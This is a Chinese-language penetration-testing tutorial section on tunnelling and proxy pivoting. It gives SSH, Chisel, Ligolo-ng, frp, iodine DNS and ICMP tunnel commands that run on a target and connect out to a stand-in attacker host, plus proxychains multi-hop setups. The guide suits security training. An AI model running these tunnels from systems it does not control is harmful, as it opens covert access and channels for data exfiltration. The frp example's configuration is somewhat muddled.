# 隧道与代理技术

### 7.1 隧道技术

```
常用隧道工具：

工具              类型          特点                    平台
─────────────────────────────────────────────────────────────
SSH隧道           标准协议       最常用，安全              多平台
Chisel           TCP/UDP       Go语言，快速              多平台
Ligolo-ng        反向隧道        简单易用                  多平台
Plon             端口转发        轻量级                    Linux
Socat            多功能         支持多种协议              多平台
rinetd           端口转发        简单稳定                  Linux
frp              反向代理        功能强大，配置灵活         多平台
ngrok            反向代理        云服务，简单               多平台
Stunnel          SSL封装        加密任意流量              多平台
Iodine           DNS隧道        通过DNS外传              多平台
Dns2tcp          DNS隧道        DNS数据传输              多平台
ICMPTunnel       ICMP隧道      通过ICMP外传              多平台
```

#### 隧道配置示例

```bash
# 1. SSH本地端口转发
# 将本地8080端口转发到目标的80端口
ssh -L 8080:target:80 user@jump_server

# 2. SSH远程端口转发 (反向隧道)
# 在目标上执行，将目标端口转发到攻击者
ssh -R 9090:127.0.0.1:3389 attacker@attacker_ip -p 22

# 3. SSH动态端口转发 (SOCKS代理)
ssh -D 1080 user@jump_server

# 4. Chisel隧道
# 攻击者端
chisel server -p 8080 --reverse
# 目标端
chisel client attacker:8080 R:1080:socks

# 5. Ligolo-ng
# 攻击者端
./ligolo-proxy -selfcert -l 0.0.0.0:9001
# 目标端
./ligolo-agent -connect attacker:9001 -ignore-cert

# 6. frp反向代理
# frps.ini (攻击者端)
[common]
bind_port = 7000
# frpc.ini (目标端)
[common]
server_addr = attacker_ip
server_port = 7000
[socks5]
type = tcp
remote_port = 1080
[plugin_socks]
type = tcp
remote_port = 1080
plugin = socks5

# 7. DNS隧道 (iodine)
# 服务端 (攻击者)
iodined -f -c -P password 10.0.0.1 tunnel.attacker.com
# 客户端 (目标)
iodine -f -P password tunnel.attacker.com

# 8. ICMP隧道
# 服务端
icmp-tunnel -s
# 客户端
icmp-tunnel -c attacker_ip
```

### 7.2 代理链与跳板

```
多级代理架构：

攻击者 → 跳板1 → 跳板2 → 目标

配置方法：

1. Proxychains
   # /etc/proxychains.conf
   [ProxyList]
   socks5 127.0.0.1 1080
   socks5 jump2_ip 1080
   
   # 使用
   proxychains nmap -sT target
   proxychains curl http://target

2. SSH多级跳转
   ssh -J user1@jump1 -L 8080:target:80 user2@jump2

3. Chisel多级代理
   # 在每个跳板上运行
   chisel client previous_jump:port R:new_port:socks
```
